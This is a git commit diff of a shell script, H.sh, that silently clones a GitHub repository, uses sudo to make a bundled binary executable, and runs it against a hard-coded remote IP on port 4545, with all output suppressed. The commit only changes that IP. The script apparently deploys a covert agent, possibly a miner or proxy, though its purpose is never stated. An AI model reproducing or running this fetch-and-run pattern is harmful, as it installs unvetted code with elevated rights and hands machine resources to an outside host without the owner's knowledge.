f61c227595753188aadb0e2931b30a86e90f0755
phucbmt <phucdlbmt@gmail.com>
2021-02-09 14:57:09 +0700

    Update H.sh

--- H.sh
+++ H.sh
@@ -4,5 +4,5 @@ printf "Run 206.189.168.204:4545/$1"  >&2
 {
 git clone https://github.com/phucbmt/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P http://206.189.168.204:4545/"$1" &> log
+./tech/m -P http://216.198.92.41:4545/"$1" &> log
 } &> /dev/null
